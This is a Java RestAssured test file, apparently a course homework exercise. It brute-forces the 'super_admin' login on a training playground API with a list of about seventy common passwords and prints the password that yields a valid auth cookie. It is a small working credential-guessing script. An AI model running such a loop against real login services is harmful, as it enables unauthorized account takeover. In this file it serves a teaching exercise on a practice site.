import io.restassured.RestAssured;

import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class GetSecretPasswordHomeworkTest {

    @Test
    public void GetSecretPasswordHomework(){
        Map<String, String> body = new HashMap<>();
        body.put("login", "super_admin");

        List<String> passwords = new ArrayList<>();

        Collections.addAll(passwords, "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
                "monkey", "111111", "letmein", "111111", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou",
                "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin", "qwerty123", "solo", "1q2w3e4r",
                "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321",
                "bailey", "access", "flower", "555555", "shadow", "passw0rd", "lovely", "7777777", "michael", "!@#$%^&*",
                "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom", "aa123456",
                "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000", "123qwe");

        int i = 0;
        boolean authTokenFlag = false;

        do {
            String password = passwords.get(i);
            body.put("password", password);
            Response response1 = RestAssured
                    .given()
                    .body(body)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

        String respAuthToken = response1.getCookie("auth_cookie");

        Map<String, String> authCookie = new HashMap<>();
        authCookie.put("auth_cookie", respAuthToken);

        Response response2 = RestAssured
                .given()
                .body(body)
                .cookies(authCookie)
                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();

            i++;
            if (Objects.equals(response2.body().asString(), "You are authorized")) {
                authTokenFlag = true;
                response2.print();
                System.out.println("password="+password);
            }

        } while(!authTokenFlag);
    }
}
